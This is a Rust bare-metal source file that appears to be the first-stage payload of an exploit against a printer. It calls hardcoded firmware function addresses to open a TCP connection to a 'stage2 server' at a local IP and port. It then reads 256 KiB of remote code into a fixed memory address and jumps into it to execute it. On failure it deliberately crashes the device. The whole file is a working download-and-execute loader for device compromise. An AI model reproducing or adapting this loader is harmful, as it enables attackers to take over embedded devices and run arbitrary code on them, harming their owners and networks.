#![feature(rustc_attrs, bool_to_option, array_chunks, asm)]
#![no_std]
#![no_main]

use core::mem::MaybeUninit;
use core::mem::size_of_val;

/// Make a very lightweight result type
type Result<T> = core::result::Result<T, ()>;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

/// Rust representation of a `struct sockaddr_in`
#[repr(C)]
struct SockaddrIn {
    family: u16,
    port:   u16,
    addr:   u32,
    unused: MaybeUninit<[u8; 0x18]>,
}

/// A raw file descriptor which cannot hold a `-1` as a value
#[rustc_layout_scalar_valid_range_start(0)]
#[rustc_layout_scalar_valid_range_end(0xFF_FF_FF_FE)]
#[repr(transparent)]
pub struct File(i32);

impl File {
    /// Create a new TCP socket
    pub fn tcp_socket() -> Result<Self> {
        unsafe {
            // Call socket(1, 1, 6)
            // This makes a TCP stream socket on the printer
            let fd =
                core::mem::transmute::<
                    usize,
                    extern fn(i32, i32, i32) -> i32
                >(0x01e780c + 1)(1, 1, 6);

            (fd != -1).then(|| Self(fd)).ok_or(())
        }
    }
}

impl Drop for File {
    fn drop(&mut self) {
        unsafe {
            // close(fd)
            core::mem::transmute::<
                usize,
                extern fn(i32) -> i32
            >(0x001e96d2 + 1)(self.0);
        }
    }
}

/// A high-level TCP socket
pub struct Socket(File);

impl Socket {
    /// Connect to an IP and port
    pub fn connect(ip: [u8; 4], port: u16) -> Result<Self> {
        // Create a TCP socket
        let socket = File::tcp_socket()?;

        // Create the address
        let addr = SockaddrIn {
            family: 0x108,
            port:   port.to_be(),
            addr:   u32::from_ne_bytes(ip),
            unused: MaybeUninit::uninit(),
        };
    
        // connect()
        let res = unsafe {
            core::mem::transmute::<
                usize,
                extern fn(i32, *const SockaddrIn, usize) -> i32
            >(0x001e7a04 + 1)(socket.0, &addr, size_of_val(&addr))
        };

        // Check for success
        (res != -1).then(|| Self(socket)).ok_or(())
    }

    /// Send a buffer to the connected socket
    /// Returns `None` if the entire buffer wasn't successfully sent
    pub fn send(&self, buf: impl AsRef<[u8]>) -> Result<()> {
        let buf = buf.as_ref();

        let res = unsafe {
            // send()
            core::mem::transmute::<
                usize,
                extern fn(i32, *const u8, usize, i32) -> isize
            >(0x1e8e56 + 1)((self.0).0, buf.as_ptr(), buf.len(), 0)
        };

        // Make sure all bytes were written
        (res == buf.len() as isize).then_some(()).ok_or(())
    }

    /// Recv a buffer from the connected socket
    /// Returns `None` if the entire buffer was not filled in a single receive
    pub fn recv(&self, buf: &mut [u8]) -> Result<usize> {
        let res = unsafe {
            // recv()
            core::mem::transmute::<
                usize,
                extern fn(i32, *mut u8, usize, i32) -> isize
            >(0x1e8128 + 1)((self.0).0, buf.as_mut_ptr(), buf.len(), 0)
        };

        // Make sure all bytes were read
        (res != -1).then_some(res as usize).ok_or(())
    }
}

/// Entry point
#[link_section = ".entry_section"]
#[no_mangle]
extern fn _start() {
    if main().is_err() {
        unsafe {
            // We know that reading this should hard reboot the printer by
            // crashing it.
            core::ptr::read_volatile(0x4000_0000 as *const u32);
        }
    }
}

/// Rust entry point
fn main() -> Result<()> {
    // Connect to the stage2 server
    let sock = Socket::connect([192, 168, 1, 2], 1234)?;

    unsafe {
        // Perform an allocation
        let alc_result = core::mem::transmute::<
            usize,
            extern fn(usize, usize) -> usize
        >(0x1f37ec + 1)(0x1973f014, 256 * 1024);

        // We expect a very specific address back from this allocation
        if alc_result != 0x19742320 {
            return Err(());
        }

        // Get a Rust slice to our allocation
        let buffer = core::slice::from_raw_parts_mut(
            alc_result as *mut u8, 256 * 1024);

        // Read in a loop until we get all 256 KiB we expect
        let mut offset = 0;
        while offset != buffer.len() {
            let bread = sock.recv(buffer.get_unchecked_mut(offset..))?;
            offset += bread;
        }

        // Jump into the stage 2
        core::mem::transmute::<
            *const u8,
            extern fn()
        >(buffer.as_ptr())();
    }

    Ok(())
}

